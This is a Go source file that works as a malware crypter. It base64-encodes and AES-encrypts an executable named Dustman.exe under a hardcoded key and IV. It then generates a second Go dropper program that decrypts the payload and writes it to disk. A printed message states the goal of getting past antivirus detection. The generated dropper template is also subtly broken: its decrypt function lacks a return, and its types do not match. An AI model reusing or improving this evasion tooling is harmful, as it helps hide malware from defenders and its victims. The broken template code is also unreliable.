package main

import (

	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"os"
)

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func byteToString(data []byte) string {
	return string(data[:])
}



func encrypt(key []byte, iv []byte, text string) string {
	plaintext := []byte(text)

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	ciphertext := make([]byte, aes.BlockSize+len(plaintext))
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		panic(err)
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)

	return base64.URLEncoding.EncodeToString(ciphertext)
}

func decrypt(key []byte, iv []byte, payloadEncrypted string) string {
	ciphertext, _ := base64.URLEncoding.DecodeString(payloadEncrypted)

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	if len(ciphertext) < aes.BlockSize {
		panic("ciphertext too short")
	}
	ciphertext = ciphertext[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)

	stream.XORKeyStream(ciphertext, ciphertext)

	return fmt.Sprintf("%s", ciphertext)
}


func writePayload(key []byte, iv []byte, bPayloadEncrypted []byte) {
	k := byteToString(key)
	i := byteToString(iv)
	//pl := byteToString(bPayloadEncrypted)
	f, err := os.Create("key.txt")
	if err != nil {
		fmt.Println(err)
		return
	}
	f.WriteString(k)
	f.Close()
	g, err := os.Create("iv.txt")
	if err != nil {
		fmt.Println(err)
		return
	}
	g.WriteString(i)
	g.Close()

	ioutil.WriteFile("bPayloadEncrypted.txt", bPayloadEncrypted, 0644)
	// Template File to generate new crypted dropper payload.
	newGoPayload := fmt.Sprintf(`
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"io/ioutil"
)
func byteToString(data []byte) string {
	return string(data[:])
}

func decrypt(key []byte, iv []byte, payloadEncrypted []byte) string {
	ciphertext, _ := base64.URLEncoding.DecodeString(payloadEncrypted)

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	if len(ciphertext) < aes.BlockSize {
		panic("ciphertext too short")
	}
	ciphertext = ciphertext[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)

	stream.XORKeyStream(ciphertext, ciphertext)

}

func main() {
	key := []byte("%s")
	iv := []byte("%s")
	payloadEncryptedBase64 := []byte("%s")
	//k := byteToString(key)
	//i := byteToString(iv)
	//pl := byteToString(payloadEncryptedBase64)
	//decodedPayload, _ := base64.StdEncoding.DecodeString(pl)
	
	payloadDecrypted := decrypt(key, iv, payloadEncryptedBase64)
	ioutil.WriteFile("./testdustman.exe", []byte (payloadDecrypted), 0777)

}`, k, i, bPayloadEncrypted)
	//ngp := stringToByte(newGoPayload)
	fmt.Printf(newGoPayload)
	ioutil.WriteFile("./newPayloadGo.go", []byte (newGoPayload), 0777)
}

func main() {
	dat, err := ioutil.ReadFile("Dustman.exe")
	check(err)
	b64dat := base64.StdEncoding.EncodeToString(dat)
	fmt.Println(string(b64dat))
	fmt.Println("\r\nbase64 encoded version. This will still trigger AV, need to shuffle\r\n")
	key := []byte("7bBjcqGgs7nbgejLJpV22CLjqmUdHDdF")
	iv := []byte("PXBaKTFr8HJycSUc")
	payloadEncrypted := encrypt(key, iv, b64dat)
	bPayloadEncrypted := []byte(payloadEncrypted)
	//fmt.Printf(payloadEncrypted)
	//fmt.Printf("payloadEncrypted Type is: %T\n",payloadEncrypted)
	//fmt.Printf("bPayloadEncrypted Type is: %T\n",bPayloadEncrypted)
	//payloadDecrypted := decrypt(key, iv, payloadEncrypted)


	//decodedPayload, _ := base64.StdEncoding.DecodeString(payloadDecrypted)
	//ioutil.WriteFile("./testdustman.exe", decodedPayload, 0777)
	check(err)
	writePayload(key, iv, bPayloadEncrypted)


}
